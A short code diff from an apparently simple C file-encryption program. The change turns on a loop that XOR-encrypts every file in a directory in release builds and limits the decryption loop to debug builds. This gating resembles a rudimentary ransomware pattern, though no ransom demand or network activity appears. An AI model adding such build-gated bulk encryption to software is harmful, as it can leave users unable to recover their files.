@@ -31,23 +31,24 @@ int main() {
     }
 
     // Encrypt files
-    // printf("Encrypting files in directory: %s\n", directory);
-    // for (int i = 0; i < file_count; i++) {
-    //     printf("Encrypting %s...\n", filenames[i]);
-    //     perform_XOR_encrypt(filenames[i], (char*)password);
-    // }
-
+#ifdef RELEASE
+    printf("Encrypting files in directory: %s\n", directory);
+    for (int i = 0; i < file_count; i++) {
+        printf("Encrypting %s...\n", filenames[i]);
+        perform_XOR_encrypt(filenames[i], (char*)password);
+    }
+#endif
 
 
     // Decrypt files (if needed)
     // Uncomment the following lines if you want to decrypt after encrypting
-    
+   #ifdef DEBUG 
     printf("Decrypting files in directory: %s\n", directory);
     for (int i = 0; i < file_count; i++) {
         printf("Decrypting %s...\n", filenames[i]);
         perform_XOR_decrypt(filenames[i], (char*)password);
     }
-    
+#endif
 
     // Free allocated memory for filenames
     for (int i = 0; i < file_count; i++) {
